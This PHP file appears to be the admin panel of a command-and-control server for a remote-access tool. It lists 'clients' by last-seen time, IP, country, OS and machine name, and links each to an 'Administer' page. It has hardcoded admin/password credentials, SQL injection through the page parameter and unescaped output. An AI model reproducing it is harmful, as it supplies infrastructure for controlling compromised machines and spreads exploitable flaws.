<?php

session_start();

// Hardcoded username and password (for demonstration purposes)
$valid_username = 'admin';
$valid_password = 'password';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    if ($username === $valid_username && $password === $valid_password) {
        // Valid credentials - set a session variable to mark the user as authenticated
        $_SESSION['authenticated'] = true;
    } else {
        echo "Invalid username or password";
    }
}

// If the user is not authenticated, show the login form
if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
    </head>
    <body>
        <h2>Login</h2>
        <form method="post" action="">
            <label for="username">Username:</label><br>
            <input type="text" id="username" name="username"><br>
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password"><br><br>
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
    <?php
    exit; // Stop further execution if the user is not authenticated
}


	if(isset($_GET['client']) && !empty($_GET['client'])){
		$client =  $_GET['client'] ;
	}
	elseif (isset($_POST['client']) && !empty($_POST['client'])){
		$client = $_POST['client'];
	}
	else{
		$client = 'no client';
	}			
			
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Control Server</title>
  <style>
    body{
      font-family: Arial, Helvetica, sans-serif;
      text-align: center;
      background-color: #659dbd;
      padding: 20px;
     
    }
	h2{
		color: #fbeec1;
	}
	#clienttable{
		text-align: center;
	}
	
    button{
		padding: 10px;
	}
	
	table {
      font-family: arial, sans-serif;
      border-collapse: collapse;
      
	  margin-left: auto;
	  margin-right: auto;
    }

	
	
    td, th {
      border: 1px solid #dddddd;
      text-align: left;
      padding: 8px;
    }

	th{
	  background-color: #f5f5dc;
	}
	td{
		font-family: courier new;
	}
	
    tr{
      background-color: #ffffff;
    }
   
  </style>
</head>
<body>
  <div id="clienttable">

	<h2>Administration</h2>
	<?php
        $db = new mysqli('sql112.example.com', 'user','pass', 'if0_34460391_clients');
	if(mysqli_connect_errno()) exit;
	echo '<p>Connected</p>';
	
	$pageLimit = 10;
	$query = "SELECT COUNT(*) FROM clients;";
	$result = mysqli_query($db, $query);
	$resultCheck = mysqli_num_rows($result);
	$count = 0;
	while ($row = mysqli_fetch_array($result)){
		echo '<p>Total Clients: '.$row[0].'</p>';
		$count = $row[0];
	}
	
	if (!isset($_GET['page'])){
		$page = 1;
	} else{
		$page = $_GET['page'];
	}

	
	
	$pageFirst = ($page-1)*$pageLimit;
	
	$query = "SELECT idle, id, name, ip, os, country FROM clients LIMIT " . $pageFirst . ',' . $pageLimit;
	$stmt = $db->prepare($query);
    
    $stmt->bind_result($idle, $id, $name, $ip, $os, $country);
	$stmt->execute();


	
	echo '<table>';
	echo '<tr><th>Last Seen (h|m|s)</th><th>ID</th><th>Country</th><th>OS</th><th>Machine</th><th>IP</th><th>Admin</th><th>Delete</th></tr>';
	while($stmt->fetch()){
		echo '<tr>';
		$administer = "<a href='/openClient.php?client=" .$name. "'>Administer</a>";
		$delete = "<a href='/index.php?id=" .$id. "'>Delete Record</a>";
		echo '<td>'.$idle.'</td><td>'.$id.'</td><td>'.$country.'</td><td>'.$os.'</td><td>'.$name.'</td><td>'.$ip.'</td><td>'.$administer.'</td>'.'</td><td>'.$delete.'</td>';
		echo '</tr>';
	}
	echo '</table>';
	
	$numPages = ceil($count/$pageLimit);
	for ($page=1;$page<=$numPages;$page++){
		echo '<a href="index.php?page=' . $page . '">' . $page . '</a> ';
	}
	

	$db->close();
	?> 
 
  </div>
	
</body>
</html>


<?php
if(isset($_GET['id']) && !empty($_GET['id'])){
	$id = $_GET['id'];
	
        $db = new mysqli('sql112.example.com', 'user','pass', 'if0_34460391_clients');
	if(mysqli_connect_errno()) exit;

	$query = "DELETE FROM clients WHERE id=?";
	$stmt = $db->prepare($query);
	$stmt->bind_param('s',$id); 
	$stmt->execute();
	$db->close();
	echo "Client deleted";
	header("Location: /index.php");
}
?>
